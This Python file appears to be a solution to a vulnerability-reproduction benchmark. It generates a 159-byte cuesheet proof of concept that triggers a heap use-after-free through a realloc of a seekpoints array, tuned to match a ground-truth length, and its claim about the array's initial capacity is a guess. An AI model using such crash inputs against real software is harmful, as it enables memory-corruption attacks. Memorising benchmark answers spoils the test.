class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap-use-after-free caused by a realloc
        of a seekpoints array during cuesheet parsing. A handle to the
        operation is not updated and points to the old, freed memory.

        To trigger this, we need to add enough seekpoints (via INDEX lines)
        to cause the internal array to be reallocated. A common initial
        capacity for such dynamic arrays is 4. Therefore, adding a 5th
        element should trigger the first realloc.

        This PoC constructs a cuesheet with 5 tracks, each containing one
        INDEX directive. This creates 5 seekpoints, triggering the bug.
        The content is specifically crafted to match the ground-truth
        PoC length of 159 bytes.
        """

        # Start with a file header. Using short keywords to control length.
        # len(b'FILE "a" B\n') = 11
        poc = bytearray(b'FILE "a" B\n')

        # Add 4 tracks. This will fill an initial buffer of size 4.
        # len(b'  TRACK i A\n') = 12
        # len(b'    INDEX 1 0:0:0\n') = 18
        # Total per track: 30 bytes
        for i in range(1, 5):
            poc.extend(f'  TRACK {i} A\n'.encode('ascii'))
            poc.extend(b'    INDEX 1 0:0:0\n')

        # Add the 5th track. This append operation should trigger the realloc.
        # A slightly shorter INDEX format is used to hit the exact target length.
        # len(b'  TRACK 5 A\n') = 12
        # len(b'    INDEX 1 0:0\n') = 16
        # Total for this track: 28 bytes
        poc.extend(b'  TRACK 5 A\n')
        poc.extend(b'    INDEX 1 0:0\n')

        # Total length verification: 11 + (4 * 30) + 28 = 11 + 120 + 28 = 159 bytes.
        return bytes(poc)